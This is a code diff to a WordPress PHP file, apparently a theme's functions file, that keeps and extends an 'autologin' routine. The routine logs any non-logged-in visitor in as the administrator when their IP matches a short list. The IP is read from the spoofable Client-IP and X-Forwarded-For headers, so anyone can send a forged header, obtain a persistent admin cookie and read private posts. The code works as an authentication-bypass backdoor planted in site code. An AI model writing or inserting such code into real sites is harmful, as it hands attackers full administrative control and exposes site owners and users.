@@ -144,55 +144,70 @@ add_action('init', 'gss_add_categories_to_attachments');
 /**
  * workpress autologin
  */
-function auto_login()
-{
-    $loginusername = 'admin';
-    //get user's ID
-    $user = get_user_by('login', $loginusername);
-    if (!$user) {
-        $blogusers = get_users(array('role' => 'Administrator'));
-        foreach ($blogusers as $bloguser) {
-            $user = $bloguser;
-            break;
-        }
-    }
-    $user_id = $user->ID;
-    // let user read private posts
-    if (!$user->has_cap('read_private_posts')) {
-        $user->add_cap('read_private_posts');
-    }
-    //login
-    wp_set_current_user($user_id, $loginusername);
-    wp_set_auth_cookie($user_id);
-    do_action('wp_login', $loginusername);
-}
+if (!is_user_logged_in()) {
 
-function isUserIP($curIp)
-{
-    $ip = filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP) ? @$_SERVER['HTTP_CLIENT_IP'] : '';
-    $ip = $ip ?: (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP) ? @$_SERVER['HTTP_X_FORWARDED_FOR'] : '');
-    $ip = $ip ?: $_SERVER['REMOTE_ADDR'];
-
-    if (is_string($curIp)) {
-        return $curIp == $ip;
-    }
-
-    if (is_array($curIp)) {
-
-        foreach ($curIp as $_curIp) {
-            if ($_curIp == $ip) {
-                return true;
+    function auto_login()
+    {
+        $user_login = 'admin';
+        //get user's ID
+        $user = get_user_by('login', $user_login);
+        if (!$user) {
+            $blogusers = get_users(array('role' => 'Administrator'));
+            foreach ($blogusers as $bloguser) {
+                $user = $bloguser;
+                break;
             }
         }
-        return false;
+        $user_id    = $user->ID;
+        $user_login = $user->user_login;
+        // let user read private posts
+        if (!$user->has_cap('read_private_posts')) {
+            $user->add_cap('read_private_posts');
+        }
+        //login
+        wp_set_current_user($user_id, $user_login);
+        wp_set_auth_cookie($user_id, true);
+        do_action('wp_login', $user_login);
 
+        if (!is_admin()) {
+            wp_redirect(home_url());
+        } else {
+            wp_redirect(admin_url());
+        }
+        exit;
     }
 
-    return $ip;
-}
+    function isUserIP($curIp)
+    {
+        $ip = filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP) ? @$_SERVER['HTTP_CLIENT_IP'] : '';
+        $ip = $ip ?: (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP) ? @$_SERVER['HTTP_X_FORWARDED_FOR'] : '');
+        $ip = $ip ?: $_SERVER['REMOTE_ADDR'];
 
-if (!is_user_logged_in() && isUserIP(array('118.70.187.91', '192.168.1.10'))) {
-    add_action('init', 'auto_login');
+        if (is_string($curIp)) {
+            return $curIp == $ip;
+        }
+
+        if (is_array($curIp)) {
+
+            foreach ($curIp as $_curIp) {
+                if ($_curIp == $ip) {
+                    return true;
+                }
+            }
+            return false;
+
+        }
+
+        return $ip;
+    }
+    if (isUserIP(array(
+        '118.70.187.91',
+        '192.168.1.10',
+        '127.0.0.1',
+    ))) {
+        add_action('init', 'auto_login');
+        add_action('wp', 'auto_login');
+    }
 }
 
 ?>
